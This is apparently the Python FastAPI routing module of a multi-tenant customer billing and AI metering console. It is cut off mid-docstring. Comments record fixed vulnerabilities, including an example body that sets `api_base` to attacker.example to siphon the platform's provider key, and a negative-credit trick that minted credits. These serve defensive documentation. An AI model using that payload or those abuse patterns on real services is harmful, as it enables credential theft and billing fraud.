"""The Customer Console HTTP surface.

WS-31 CP-1/CP-3 · spec ``project-docs/specs/customer_console.md`` §6.

**Four authentication schemes, and which one an endpoint takes is a design
statement** (see :mod:`customer_console.auth`):

  * ``Operator`` — a staff token, for cross-organization surfaces: provisioning,
    seat writes, credit grants, key issuance.
  * ``Internal`` — the Router's token, for writing the meter.
  * ``KeyCaller`` — the customer's own ``cc_live_…`` key. **Read-only**, and it
    reaches exactly one endpoint (``/me``). **The key resolves the
    organization**; nothing under key auth takes an organization from request
    input, because that would make the caller the authority on which customer
    they are (``user_management_contract.md`` R11).
  * ``ResolveCaller`` / ``ProvisionCaller`` — the ``cc_depl_…`` deployment key
    at the two doors its **capabilities** open: ``resolve`` reaches
    ``POST /registry/resolve`` (CP-2b) and ``provision`` reaches the second arm
    of ``POST /orgs/provision`` (CP-2c slice 1). Both endpoints take **both**
    that key and ``Operator``: one endpoint, two schemes, and the credential —
    never the body — chooses the shape. A key holding only ``{resolve}``, the
    column default, is refused at provision with a logged 403.

⚠️ The customer key deliberately cannot write the meter. It briefly could, and
verification found that let a negative ``billed_credits`` mint credits — and,
more fundamentally, made the metered party the reporter of its own usage. See
:mod:`customer_console.auth` for the full note.

Both fail **closed**: the operator token has no default and an unconfigured
deployment 503s rather than admitting anyone. That is CP-0's lesson applied from
the first line rather than retrofitted — do not "temporarily" relax it, which is
precisely how the workbench came to serve every route to anyone (D33.1).

Still to come: the customer-admin surface is WS-30's, and the operator console is
CP-8 — a separate deployable app (D35), never a route tree in here.

Endpoints are ``def`` rather than ``async def`` so FastAPI runs them in its
threadpool alongside the sync engine (see :mod:`customer_console.db`). ⚠️ CP-4 first
shipped ``/v1/chat/completions`` as ``async def`` while still opening the sync
engine inside it, which blocked the event loop for two round trips on the
highest-QPS endpoint on the plane *and* contradicted this paragraph. It is
``def`` again; the provider coroutine is driven with ``asyncio.run`` inside the
threadpool worker.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import uuid
from datetime import datetime
from decimal import Decimal
from typing import Any

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field, field_validator
from sqlalchemy import text

from customer_console import payments, store
from customer_console.auth import (
    Caller,
    CatalogCaller,
    DeploymentCaller,
    Internal,
    KeyCaller,
    MemberAdminCaller,
    Operator,
    PayingCaller,
    ProvisionCaller,
    ResolveCaller,
    SeatAdminCaller,
    SignedWebhook,
)
from customer_console.credits import (
    CREDIT_QUANTUM,
    LEDGER_REASON_MANUAL,
    LEDGER_REASON_PURCHASE,
    LEDGER_REASONS,
    OverdraftPolicy,
    RunCeiling,
    TokenUsage,
    UnpricedModel,
    balance_of,
    decide_run_ceiling,
    decide_spend,
    quantize_credits,
    rate_call,
)
from customer_console.db import get_engine
from customer_console.keys import (
    ENV_DISCOUNT,
    is_discount_code,
    mint_key,
    split_key,
    verify_secret,
)
from customer_console.lifecycle import (
    TransitionRefused,
    assert_transition,
    capabilities_of,
)
from customer_console.router import (
    ExtractedUsage,
    TierUnknown,
    call_provider,
    provider_credential,
    resolve_rate_card,
    resolve_tier,
    usage_from_response,
)
from customer_console.seats import CORE_PLAN_SLUG, decide_assignment, seat_counts

_log = logging.getLogger("platform.router")

app = FastAPI(
    title="Metorite Customer Console",
    description=(
        "Organizations, seats, subscriptions and AI metering. Cross-tenant by "
        "design (saas_multitenancy.md §0.9.2) — never exposed to a tenant."
    ),
    version="0.1.0",
)


# ── Schemas ─────────────────────────────────────────────────────────────────

class ProvisionRequest(BaseModel):
    """One body, two schemes — and ``deployment_label`` is what tells them apart.

    ⚠️ It is **optional here and mandatory in neither direction by pydantic**,
    on purpose, exactly as :class:`ResolveRequest`'s ``org_slug`` is. Under the
    operator scheme it is required; under a deployment key it is refused with a
    **400**. Both rules are enforced in the handler rather than by the model,
    because a model can only express one of them, and the one it would express
    (``str``, required) is the shape the deployment-key arm exists to forbid
    for the caller it is about.

    A missing operator ``deployment_label`` therefore answers **400** and not
    pydantic's 422 — pinned by ``test_nothing_infers_the_deployment_from_there_
    being_exactly_one``, whose clause (a) was amended for exactly this reason
    (WS-31 CP-2c slice 1; D46.6 item 1 as amended in ``customer_console.md``,
    ruled in writing rather than by an implementer in silence). The 422 that
    clause used to assert was *pydantic refuses before the handler runs*; the
    property it asserts now is *the handler refuses without consulting a
    count*, which is weaker to start from and is why the ``count(*) = 1``
    mutation is still run against it.
    """

    slug: str
    name: str
    #: Which deployment this organization is placed on — **named by the
    #: operator, and named by NOBODY else** (WS-29 MT-1j slice 4 · D46.6 item
    #: 1). The `Operator` credential is cross-org by design and carries no
    #: deployment identity of its own, so the box has to be said out loud; it
    #: resolves against `deployment.label` (`001_customer_console.sql:82-94`,
    #: UNIQUE) — a name rather than a UUID, because an operator can say a name.
    #:
    #: ⚠️ **Absent under a deployment key. Present is 400, never ignored** —
    #: that caller IS a deployment, so naming one would be a credential
    #: asserting an identity it already has and might be asserting a different
    #: one (R11, the same rule as `ResolveRequest.org_slug`). An ignored field
    #: is a caller who believes it worked.
    #:
    #: ⚠️ **Nothing infers it in either arm.** A `count(deployment) = 1`
    #: fallback is forbidden by name (D46.6 item 3, `store.deployment_by_label`)
    #: — a missing operator label is a 400 and an unknown one a 404 even with
    #: exactly one deployment seeded.
    deployment_label: str | None = None
    #: Captured at SIGNUP, not at first invoice (saas_operations_doctrine.md
    #: §3.1) — chasing a GSTIN after invoices have gone out is a customer
    #: conversation, not a migration.
    gstin: str | None = None
    billing_state: str | None = None
    owner_email: str
    core_seats: int = Field(default=1, ge=1)


class LifecycleRequest(BaseModel):
    org_slug: str
    target: str
    reason: str | None = None
    #: Days of export window when moving to `cancelled`. Named here so the
    #: window is an explicit act rather than an implicit default nobody chose.
    export_window_days: int = Field(default=30, ge=1)


class OrgPurgeRequest(BaseModel):
    """CP-2g — strip a DELETED organization's registry plane.

    ``confirm`` must echo ``org_slug`` verbatim: the operator UI makes the
    human type the slug, and this door refuses a caller that did not carry
    that typing through — a purge must never be reachable by a mis-clicked
    retry with a stale body.
    """

    org_slug: str
    confirm: str


class ResolveRequest(BaseModel):
    """One body, two schemes — and ``org_slug`` is what tells them apart.

    ⚠️ It is **optional here and mandatory in neither direction by pydantic**,
    on purpose. Under the operator scheme it is required; under a deployment
    key it is refused with a **400**. Both rules are enforced in the handler
    rather than by the model, because a model can only express one of them, and
    the one it would express (``str``, required) is the shape CP-2b's clause 2
    exists to forbid for the caller it is about.

    A missing operator ``org_slug`` therefore answers **400** and not pydantic's
    422 — pinned by ``test_an_operator_without_an_org_slug_is_refused``, because
    relaxing a model is exactly how a required field silently becomes optional.
    """

    #: Absent under a deployment key. **Present is 400, never ignored** — an
    #: ignored field is a caller who believes it worked (clause 2).
    org_slug: str | None = None
    email: str
    display_name: str | None = None


class SeatWriteRequest(BaseModel):
    org_slug: str
    email: str
    plan_slug: str
    source: str = "alacarte"


class AdminSchemeRequest(BaseModel):
    """The two fields that decide WHICH SCHEME a customer-admin write is under.

    Shared by ``POST /registry/seats{,/release}`` (§6 item (h)) and
    ``POST /registry/members`` (CP-2f) because both doors ask the identical
    question of the body and get it answered by :func:`_admin_scheme_context`.
    Extracted rather than copied: two models with the same two fields are two
    places for R11 to be applied differently, which is how a derivation becomes
    an assertion.

    **The org and the actor are NOT the request.** Under the deployment-key
    scheme they are DERIVED together from ``store.deployment_visible_orgs(
    deployment_id, actor_email)`` — the placement∩membership join — never
    asserted, which is R11 at the same strength ``ResolveRequest`` applies it:
    the caller makes no tenant claim, the org is the ANSWER. ``actor_email`` is
    the human the box just authenticated; the box vouches for it exactly as
    ``ResolveRequest.email`` is vouched for.

    ``org_slug`` mirrors ``ResolveRequest``'s: **absent under a deployment key,
    and present is 400, never ignored** (an ignored field is a caller who
    believes it named its tenant). It is the operator arm's required subject —
    a cross-org staff act, as at ``POST /billing/seats``.
    """

    #: Present under the deployment-key scheme; the box vouches for the acting
    #: admin. Absent under the operator scheme, which names the org instead.
    actor_email: str | None = None
    #: Named by the OPERATOR; a deployment key naming one is 400 (R11).
    org_slug: str | None = None


class SeatAdminRequest(AdminSchemeRequest):
    """The customer-authenticated seat write's body (§6 item (h))."""

    #: The target — the ONLY subject the body names. Validated against a
    #: membership in the RESOLVED org (clause 4); never ``ensure_identity``-minted,
    #: so an arbitrary typed-in email cannot become a global identity.
    member_email: str
    plan_slug: str
    #: The seat's billing category. Never ``core`` — membership IS the Core seat
    #: (D19.3), so ``plan_slug='core'`` is refused outright below.
    source: str = "alacarte"


class MemberAdminRequest(AdminSchemeRequest):
    """The customer-authenticated MEMBER write's body (CP-2f, D50.2).

    ⚠️ **There is no ``role`` field, and adding one is a design change, not a
    convenience.** The membership is written at the ``org_membership.role``
    column default (``member``). ``role`` is registry/billing vocabulary (D12)
    while the tenant's permission vocabulary is ``org_role``; accepting a role
    here would either mint a mapping between the two — the second grant
    vocabulary root ``CLAUDE.md`` §5 forbids by name — or let a customer admin
    create registry admins through the invite door. See
    ``store.add_invited_member``.

    ⚠️ **``display_name`` is a LABEL for the global identity, never an identity
    and never a tenant** — the same status it has on ``ResolveRequest``. Nothing
    branches on it.
    """

    #: The person being added. Unlike ``SeatAdminRequest.member_email`` this one
    #: IS ``ensure_identity``-minted, because this door is what makes the member
    #: exist — that is the difference between the write door and the seat door,
    #: and it is why they take different capabilities.
    member_email: str
    display_name: str | None = None


class CreditGrantRequest(BaseModel):
    """An operator's ledger write.

    ⚠️ ``reason`` was free-form TEXT until CP-9, which is why *"a discounted
    purchase is distinguishable a year later"* was a hope rather than a fence
    (SC-4g (v)). It is now checked against :data:`credits.LEDGER_REASONS` — the
    **expand-phase** half of that clause, and deliberately the only half in
    this slice: a `CHECK` constraint on ``credit_ledger.reason`` would reject
    rows the running code can still write, which is R6's whole subject. The
    constraint is a later contract-phase migration.

    Validated rather than typed as a ``Literal`` so the vocabulary has exactly
    one definition — a Literal here would be a second copy, and a second copy
    of a vocabulary is how two writers come to disagree about one event.
    """

    org_slug: str
    credits: Decimal
    reason: str = LEDGER_REASON_PURCHASE
    ref: str | None = None

    @field_validator("reason")
    @classmethod
    def _known_reason(cls, value: str) -> str:
        if value not in LEDGER_REASONS:
            raise ValueError(
                f"{value!r} is not a ledger reason; expected one of "
                f"{sorted(LEDGER_REASONS)} (subscription_console.md SC-4g (v))"
            )
        return value


class ManualActivationRequest(BaseModel):
    """Operator-only. Activate a PAID plan a customer paid for OUT OF BAND.

    The offline twin of ``payments.fulfil`` (§6 item (j)): it composes the same
    three writers — the subscription, the seat grant, the optional credit —
    **minus the Razorpay order**, because there is none. The money arrived by
    bank transfer and an operator is recording it, so ``provider='manual'`` (the
    name ``001_customer_console.sql:163``'s CHECK pre-provisioned for exactly
    this) and the provider id columns stay NULL.

    ``org_slug`` names the customer. **R11 does not bind a NAMED-org staff route**
    — ``Operator`` is cross-org and carries no tenant of its own, exactly as
    ``POST /billing/seats``'s ``SeatWriteRequest`` names one — but the org is
    still resolved from the validated slug, never taken from an unauthenticated
    body identity.
    """

    #: The customer whose PAID plan is being activated. Resolved to an
    #: ``organization_id`` by ``_org_id`` (404 if unknown), never trusted as an
    #: identity — the credential is the operator's, cross-org by design.
    org_slug: str
    #: The plan the seats are granted on. Must be an ACTIVE ``plan_catalog`` row
    #: (``store.priced_plan``) or the route answers 400 — a manual activation
    #: sells only what the catalog prices, exactly as the checkout does (§9.1).
    plan_slug: str
    #: PAID seats to grant on ``plan_slug`` — the plan's paid capacity, not a
    #: per-member assignment. A signed ``seat_grant`` quantity (``grant_seats``);
    #: at least one, because activating zero paid seats is not an activation.
    seats: int = Field(ge=1)
    #: AI credits to add, when the bank transfer included them. Decimal, never
    #: float — the ledger is a customer's dispute evidence (``credits`` doctrine).
    credits: Decimal | None = None
    #: The subscription term. Defaults to ``payments.SUBSCRIPTION_TERM_MONTHS``
    #: (the one purchased term the checkout path also uses) — the catalog defines
    #: no per-plan term, so there is nothing narrower to read.
    term_months: int | None = Field(default=None, ge=1)
    #: The operator's free-text note — e.g. the bank-transfer reference. Recorded
    #: in the audit detail and, when credits are added, as the ledger ``ref``.
    reference: str | None = None

    #: A value-moving write: an unknown field is a caller mistake, refused rather
    #: than silently ignored (as ``CreateOrderRequest``/``IssueDiscountRequest``).
    model_config = {"extra": "forbid"}


class IssueKeyRequest(BaseModel):
    org_slug: str
    label: str | None = None


class RevokeKeyRequest(BaseModel):
    org_slug: str
    prefix: str


class OrderLineRequest(BaseModel):
    """One basket line. The PRICE is not here — the catalog decides it."""

    plan_slug: str
    quantity: int = Field(ge=1)


class CreateOrderRequest(BaseModel):
    """A basket. Deliberately carries no amount, no currency and no code.

    A caller-supplied amount would be a caller-supplied price, and a checkout
    that trusts the browser about what something costs is the oldest bug in
    e-commerce. Every paisa comes from ``plan_catalog`` through
    ``payments.paise`` (§9.2).
    """

    lines: list[OrderLineRequest] = Field(min_length=1)

    model_config = {"extra": "forbid"}


class RedeemRequest(BaseModel):
    """The bearer code, whole. Only its PREFIX is ever stored or logged."""

    code: str

    model_config = {"extra": "forbid"}


class IssueDiscountRequest(BaseModel):
    """Operator-only. The pre-authorization a customer later presents."""

    label: str
    kind: str
    #: NULL = an OPEN code any organization may present. Naming an org binds it.
    org_slug: str | None = None
    percent_bp: int | None = Field(default=None, ge=1, le=10000)
    amount_paise: int | None = Field(default=None, ge=1)
    max_redemptions: int = Field(default=1, ge=1)
    expires_at: datetime | None = None

    model_config = {"extra": "forbid"}


class OrderLineView(BaseModel):
    plan_slug: str
    quantity: int
    unit_price_paise: int


class OrderDiscountView(BaseModel):
    #: The code's clear prefix — NEVER its secret (SC-4g (i)).
    code_prefix: str
    discount_paise: int


class OrderView(BaseModel):
    """What a customer may read back about their own order (§9.3a).

    ⚠️ **Deliberately absent: ``provider_order_id`` and any provider payload.**
    The customer's browser has no use for the provider's identifiers, and a
    field nothing reads is a field somebody eventually reads. Pinned
    structurally by ``test_the_order_read_carries_no_provider_identifiers``, so
    adding one has to argue with a red test rather than with a reviewer's
    attention.

    Integer paise on the wire, as everywhere else: the browser formats, it
    never arithmetics.
    """

    id: str
    status: str
    provider: str
    gross_paise: int
    discount_paise: int
    taxable_paise: int
    gst_paise: int
    total_paise: int
    gst_split: str | None
    expires_at: datetime
    created_at: datetime
    terminal_at: datetime | None
    lines: list[OrderLineView] | None = None
    discount: OrderDiscountView | None = None


class OrderPageView(BaseModel):
    """A page of orders. Same objects, without ``lines`` (§9.3a)."""

    orders: list[OrderView]
    #: The id to pass as ``cursor`` for the next page, or ``None`` at the end.
    next: str | None = None


class CatalogPlanView(BaseModel):
    """One sellable catalog row (§6 item (f)).

    ⚠️ **Five fields, and the money one is PAISE** — pinned exactly by
    ``test_the_catalog_read_carries_no_per_org_state_and_paise_only``, for
    ``OrderView``'s reason: a field nothing reads is a field somebody
    eventually reads.

    Two absences are the design. **No ``price_inr``:** a rupee field beside a
    paise-denominated order API is precisely the ambiguity §9.2 exists to
    prevent, and one denomination on the wire means the browser can only
    format. **No per-org state** — no entitlement, no seat count, no
    org-specific price. Prices are catalog data (MT-2/SC-1a own per-org
    pricing and neither is built), and a catalog that answers differently per
    customer is a pricing engine, which this is not.
    """

    slug: str
    name: str
    kind: str
    price_paise: int
    sort_order: int


class CatalogView(BaseModel):
    """The priced ladder, active rows only, in ``sort_order`` (§6 item (f))."""

    plans: list[CatalogPlanView]


class SeatPlanView(BaseModel):
    """One plan's seat counts for the calling organization (§6 item (g)).

    ⚠️ **Exactly five fields, and they ARE the one seat vocabulary** — pinned by
    ``test_the_seats_read_carries_the_seat_vocabulary_and_nothing_else``, on the
    model AND on the wire, for ``CatalogPlanView``'s reason: a field nothing reads
    is a field somebody eventually reads. The four counts are
    :class:`customer_console.seats.SeatCounts`'s — ``available`` zero-clamped,
    ``oversubscribed`` its companion — surfaced, never recomputed.

    Two absences are the design. **No organization id:** the organization is the
    credential's, so putting it on the wire would echo back the one thing a
    customer must never be able to NAME (R11). **No price:** a seat is a count,
    not a quote — pricing is ``GET /billing/catalog``'s (and MT-2/SC-1a's), and a
    seat grid that also quoted money would be a second denomination on a second
    wire, exactly the ambiguity ``CatalogPlanView`` keeps off this API.
    """

    plan_slug: str
    purchased: int
    assigned: int
    available: int
    oversubscribed: bool


class SeatsView(BaseModel):
    """The caller's seats, one row per plan it has touched (§6 item (g)).

    Plans with neither a grant nor a live assignment are **absent**, not zero
    rows — the same skip ``billing_summary`` makes, so "the org never bought this"
    and "the org bought zero of this" are not made to look alike.
    """

    plans: list[SeatPlanView]


class MemberView(BaseModel):
    """One membership row for the calling organization (§6 item (i)).

    ⚠️ **Exactly three fields — the membership triple** — pinned by
    ``test_the_members_read_carries_the_membership_triple_and_nothing_else``, on
    the model AND on the wire, for ``SeatPlanView``'s reason: a field nothing
    reads is a field somebody eventually reads. ``email`` is the joined
    ``user_identity.email`` (``CITEXT``); ``role`` and ``status`` are the
    membership vocabularies (``001_customer_console.sql:121-131``). Surfaced from
    ``store.org_members``, never recomputed.

    The absences are the design. **No organization id / identity id:** the
    organization is the credential's, so echoing it back would name the one thing
    a customer must never be able to NAME (R11), and an internal ``user_identity``
    id is not the customer's to hold.

    ``seats`` was one of those absences — "which seats does this member hold" was
    DEFERRED as a second query this read would not carry. **D49 undefers it**
    (``launch_surface.md`` LS-7): *Unassigned* has to be a first-class state on
    the seat surface so a released member can be reassigned, and an empty list
    here is precisely what that means. It costs exactly **one** extra query for
    the whole roster (:func:`customer_console.store.live_seats_by_email`), folded
    in memory — never one per member.

    It carries plan SLUGS and no counts. The counts stay ``GET /me/seats``'s, the
    one seat vocabulary (§3.3, D32.5): a per-member count here would be a second
    place the same arithmetic lives, and the second place is the one that
    disagrees.
    """

    email: str
    role: str
    status: str
    #: Live seat plan slugs this member holds. **Empty means Unassigned** — the
    #: state the seat surface exists to make actionable. Never null: a missing
    #: list and an empty one would read alike to a client, and one of them would
    #: silently mean "we did not look".
    seats: list[str] = Field(default_factory=list)


class MembersView(BaseModel):
    """The calling organization's members, one row per membership (§6 item (i)).

    Every membership row is present with its ``status`` on the wire — the read
    applies no status filter and no per-member policy (``store``'s "fetches rows,
    decides nothing" doctrine); the surface chooses which statuses to render.
    """

    members: list[MemberView]


class OrgSummaryView(BaseModel):
    """One organization's line on the Operator Console customer list (§4.1a, CP-8).

    The cross-org twin of ``GET /billing/summary``'s per-org envelope: the same
    ``seats`` (the ONE seat vocabulary, :class:`SeatPlanView`) and
    ``credit_balance`` (``SUM(delta)`` as a decimal string), plus the fields a
    staff list needs that a single-org detail read does not — the lifecycle
    ``status``, the billing ``subscription_status``, trial expiry, and MRR.

    ⚠️ **``mrr_paise`` is PAISE**, the one money denomination on this API
    (``CatalogPlanView`` keeps rupees off the wire for ``payments.paise``'s
    reason, §9.2): the browser formats, it never converts. It is the recurring
    value of the org's *purchased* seats and is **zero unless the subscription is
    active** — a trial is not revenue yet and a suspended or cancelled org is
    churned, so an MRR that counted them would misreport the book. That gate is
    an agent-proposed default the owner may overrule (D16/D17).

    **Two statuses, because they legitimately diverge.** ``status`` is the
    ``organization`` lifecycle (§4.1d) the suspend/resume act moves;
    ``subscription_status`` is ``org_subscription.status``, which a manual
    activation sets to ``active`` without touching the lifecycle. Both are on the
    wire so the operator reads the real state rather than an inferred one.
    """

    slug: str
    name: str
    status: str
    subscription_status: str | None
    provider: str | None
    trial_ends_at: str | None
    current_period_end: str | None
    export_until: str | None
    credit_balance: str
    mrr_paise: int
    seats: list[SeatPlanView]


class OrgListView(BaseModel):
    """Every organization, one :class:`OrgSummaryView` each (§4.1a, CP-8).

    In ``created_at, slug`` order (``store.cross_org_summary``) so the list is
    stable across reads; the surface sorts and filters, this read does not.
    """

    organizations: list[OrgSummaryView]


class UsageRequest(BaseModel):
    """Written by the **Router**, which holds the internal token — never by the
    customer whose usage it describes.

    ``organization_id`` is named explicitly here and that is correct: the caller
    is trusted infrastructure serving every customer, so naming the subject is
    its job, exactly as it is for the operator surfaces. R11's prohibition is on
    letting an *untrusted* caller name its own tenant, which is what the
    organization-key version of this endpoint did and why it was withdrawn.

    ⚠️ Every quantity is floored at zero. Without ``ge=0`` a negative
    ``billed_credits`` became a *positive* ledger delta — verification minted
    100,000 credits through this endpoint on a live database. The schema carries
    the matching CHECK constraints (migration 003) so the floor survives a
    future caller that bypasses this model.
    """

    organization_id: str
    request_id: str
    billed_credits: Decimal = Field(default=Decimal(0), ge=0)
    user_email: str | None = None
    agent: str | None = None
    module_slug: str | None = None
    model: str | None = None
    tier: str | None = None
    #: D1's attribution four-tuple is (run, member, agent, instance). Without
    #: the run id a completion cannot be rolled up per agent run, which is the
    #: unit an operator actually debugs.
    run_id: str | None = None
    prompt_tokens: int = Field(default=0, ge=0)
    completion_tokens: int = Field(default=0, ge=0)
    cached_tokens: int = Field(default=0, ge=0)


#: Parameters a caller may forward to the provider. **An allowlist, not a
#: blocklist**, and the difference was a live credential-exfiltration hole.
#:
#: CP-4 shipped `extra="allow"` and excluded two fields by name. `api_base` was
#: therefore forwarded from the request body, and was only overridden when the
#: credential row happened to carry one — which the platform's own row does not.
#: Verification measured the result: a customer sending
#: `{"api_base": "https://attacker.example/v1"}` received a 200 while OUR
#: platform provider key was sent to their host. One field, total compromise of
#: the credential `004_provider_keys.sql` exists to protect.
#:
#: A blocklist is only ever as complete as the author's imagination of the
#: provider's parameter surface — and litellm's surface grows without asking us.
_FORWARDABLE = frozenset({
    "messages", "temperature", "top_p", "n", "stop", "max_tokens",
    "presence_penalty", "frequency_penalty", "logit_bias", "user",
    "response_format", "seed", "tools", "tool_choice", "parallel_tool_calls",
    "reasoning_effort", "thinking",
})

#: Ceilings on the parameters that multiply what one request costs US.
#: Verification forwarded `num_retries=50`, `timeout=9999` and
#: `max_tokens=10_000_000` untouched; combined with meter suppression that is a
#: zero-balance trial org burning our provider account with nothing to show for
#: it. "No gate" (CP-4 is unpriced) was the decision; "no ceiling" was not.
_MAX_OUTPUT_TOKENS = 32_000


class CompletionRequest(BaseModel):
    """An OpenAI-shaped chat completion, addressed to a TIER.

    ⚠️ `extra="forbid"`. Everything the caller may forward is named in
    :data:`_FORWARDABLE`; anything else is rejected rather than passed through.
    See that constant for the hole this closes.
    """

    model: str = "tier-balanced"
    messages: list[dict[str, Any]]
    #: The caller's own correlation id. Stored as `client_ref`, trusted for
    #: NOTHING — it used to be the metering idempotency key, which let a caller
    #: suppress their own meter by reusing one value forever (verification F2).
    client_ref: str | None = None
    stream: bool = False

    temperature: float | None = None
    top_p: float | None = None
    n: int | None = None
    stop: Any | None = None
    max_tokens: int | None = Field(default=None, ge=1)
    presence_penalty: float | None = None
    frequency_penalty: float | None = None
    logit_bias: dict | None = None
    user: str | None = None
    response_format: dict | None = None
    seed: int | None = None
    tools: list | None = None
    tool_choice: Any | None = None
    parallel_tool_calls: bool | None = None
    reasoning_effort: str | None = None
    thinking: dict | None = None

    model_config = {"extra": "forbid"}


# ── Helpers ─────────────────────────────────────────────────────────────────

def _org_id(conn, slug: str) -> str:
    row = conn.execute(
        text("SELECT id FROM organization WHERE slug = :slug"), {"slug": slug}
    ).first()
    if row is None:
        raise HTTPException(status_code=404, detail=f"no organization {slug!r}")
    return str(row[0])


def _iso(value) -> str | None:
    """ISO-8601 a nullable ``date``/``datetime`` for the wire, or ``None``.

    A timestamp column that is unset (a never-trialled org's ``trial_ends_at``,
    a live org's ``export_until``) is ``NULL`` and stays ``null`` on the wire —
    not coerced to a sentinel date the surface would render as a real deadline.
    """
    return value.isoformat() if value is not None else None


def _seat_grid(conn, org_id: str) -> list[SeatPlanView]:
    """The per-plan seat grid for one organization — the ONE seat-grid loop.

    Both the operator's ``GET /billing/summary`` (cross-org, by ``org_slug``) and
    the customer's ``GET /me/seats`` (own org, from the credential) render exactly
    this: every ACTIVE plan the org holds a grant or a live assignment on, in
    ``sort_order``, folded through the one seat vocabulary — ``store.seat_rows``
    through ``seat_counts`` (§3.3, D32.5). ``available``'s zero-clamp and
    ``oversubscribed`` are ``seat_counts``'s, surfaced not recomputed, and a plan
    the org never touched is skipped, not emitted as a zero row.

    Extracted so the two surfaces cannot drift into two loops: one enumerate →
    skip → fold, one SQL, computed once. ``billing_summary`` wraps the same grid
    in its ``organization_id``/``credit_balance`` envelope; ``my_seats`` returns
    it as a bare ``SeatsView``.
    """
    plans = [
        r[0] for r in conn.execute(
            text("SELECT slug FROM plan_catalog WHERE active ORDER BY sort_order")
        )
    ]
    grid = []
    for plan in plans:
        grants, assigned = store.seat_rows(conn, org_id=org_id, plan_slug=plan)
        if not grants and not assigned:
            continue  # never bought, never assigned — not worth a row
        c = seat_counts(plan, grants, assigned)
        grid.append(SeatPlanView(
            plan_slug=plan,
            purchased=c.purchased,
            assigned=c.assigned,
            available=c.available,
            oversubscribed=c.oversubscribed,
        ))
    return grid


def _audit(conn, org_id: str | None, action: str, detail: dict[str, Any],
           *, actor: str = "operator") -> None:
    """Write one audit row.

    ``actor`` defaults to ``operator`` because that was every writer until CP-9;
    the checkout is the first surface a CUSTOMER's own credential writes
    through, and an audit trail that called those acts "operator" would
    misattribute the one class of write we most need to tell apart later.
    """
    conn.execute(
        text(
            "INSERT INTO control_audit (organization_id, actor, action, detail) "
            "VALUES (:org, :actor, :action, CAST(:detail AS jsonb))"
        ),
        {"org": org_id, "actor": actor, "action": action,
         "detail": json.dumps(detail)},
    )


# ── CP-6: rating, the balance gate and the per-run breaker ──────────────────

#: Ship dark (CLAUDE.md §4). With this unset — the state of every environment —
#: the Router behaves exactly as CP-4 shipped it: it forwards, it counts, and it
#: refuses nothing. With it set, the two CP-6 refusals below become live.
#:
#: It is a flag rather than always-on for one measured reason: a newly
#: provisioned organization is `trial` with a zero balance, and **how many
#: credits a trial starts with is an open owner input** (spec §9.2). Enforcing
#: on that today would refuse the first AI call of every new customer, which is
#: a product outage dressed as a billing control. Flipping it for a real
#: customer is the owner's act, on the same footing as §8's gate 5.
_SPEND_GATE_ENV = "CUSTOMER_CONSOLE_SPEND_GATE"
_TRUTHY = frozenset({"1", "true", "yes", "on"})


def _spend_gate_enabled() -> bool:
    return os.environ.get(_SPEND_GATE_ENV, "").strip().lower() in _TRUTHY


def _spend_refusal(conn, caller: Caller) -> HTTPException | None:
    """Pre-flight: may this organization spend on this call? (§4.4)

    Returns the refusal to raise, or ``None`` to proceed. Returned rather than
    raised so the caller can leave the transaction cleanly — nothing here
    writes, and an exception thrown through ``engine.begin()`` reads as if it
    might have.

    **The cost passed to the gate is one credit quantum, not an estimate.** The
    true cost of a completion is unknowable until the provider answers, and an
    estimate would either refuse calls the customer can afford (if we guessed
    from the 32k output ceiling) or wave through the one that empties the
    account. So the pre-flight asks the only question it can answer honestly —
    *is there any headroom left at all?* — and the real draw happens at metering
    against the tokens actually consumed. §4.4's soft-block does the rest: at
    zero a paying organization keeps working into the grace overdraft and only
    stops at the floor.
    """
    balance = balance_of(store.credit_deltas(conn, org_id=caller.organization_id))
    decision = decide_spend(
        balance,
        CREDIT_QUANTUM,
        policy=OverdraftPolicy(),
        is_trial=(caller.organization_status == "trial"),
    )
    if not decision.allowed:
        return HTTPException(
            status_code=decision.status,
            detail={"reason": decision.reason, "top_up": decision.top_up},
        )

    # The circuit breaker. Only a call that names a run can be part of a
    # runaway loop, and only that run is stopped — a second run for the same
    # organization is unaffected, because the ceiling is a tripwire on one
    # loop, not a budget on the customer.
    if caller.run_id:
        spent = store.run_spend(
            conn, org_id=caller.organization_id, run_id=caller.run_id
        )
        ceiling = RunCeiling()
        if not decide_run_ceiling(spent, ceiling=ceiling).allowed:
            _log.warning(
                "router.run_ceiling_tripped",
                extra={"cc_run_id": caller.run_id},
            )
            return HTTPException(
                status_code=403,
                detail={
                    "reason": "run_ceiling_exceeded",
                    "run_id": caller.run_id,
                    "spent_credits": str(spent),
                    "ceiling_credits": str(ceiling.max_credits),
                },
            )
    return None


def _rate_completion(conn, *, model: str, usage: ExtractedUsage) -> Decimal:
    """Credits drawn by one completion. **Never raises.**

    An unpriced model bills zero *loudly* rather than failing the call: the
    completion has already happened and the customer already has it, so the
    only choice left is whether we also lose the usage row. We do not — the row
    is the evidence, and CP-6 sets prices against exactly this data.
    ``002_seed_catalog.sql`` seeds the card at zero on purpose, so this warning
    is the expected state until the owner prices it (a commercial act, §8).

    ⚠️ **BYOK is not zero-rated here yet.** §3.4 says a BYOK organization is
    metered but not charged for tokens; today this function does not know which
    credential served the call, so a priced card would charge them. Harmless
    while every card is zero, and it must be closed before any real price is
    set — it is recorded in the spec's CP-6 note rather than left as a surprise.
    """
    try:
        card = resolve_rate_card(conn, model)
        return quantize_credits(
            rate_call(
                card,
                TokenUsage(
                    prompt_tokens=usage.prompt_tokens,
                    completion_tokens=usage.completion_tokens,
                    cached_tokens=usage.cached_tokens,
                ),
            )
        )
    except UnpricedModel:
        # `router_model`, not `model`: a stdlib LogRecord already owns several
        # short names and a collision raises inside the logging call itself.
        _log.warning("router.unpriced_model", extra={"router_model": model})
        return Decimal(0)


# ── Routes ──────────────────────────────────────────────────────────────────

@app.get("/health")
def health() -> dict[str, str]:
    """Liveness. Deliberately unauthenticated and deliberately says nothing."""
    return {"status": "ok"}


@app.post("/orgs/provision")
def provision(req: ProvisionRequest, caller: ProvisionCaller) -> dict[str, Any]:
    """Create an organization, its owner and its Core seats. Idempotent.

    Idempotent on the org slug rather than on a request id, because the natural
    key is what a retrying signup form actually resends. Provisioning is a
    multi-step action that WILL fail halfway; re-running it must converge on one
    organization rather than produce a second (§2.1).

    **It also PLACES the organization** (WS-29 MT-1j slice 4). Until 2026-08-19
    nothing in the tree wrote ``org_placement``, and ``store.
    deployment_visible_orgs`` inner-joins it — so an organization created here
    could never be resolved by any deployment key, forever, failing closed in a
    way that reads as "the Console is down".

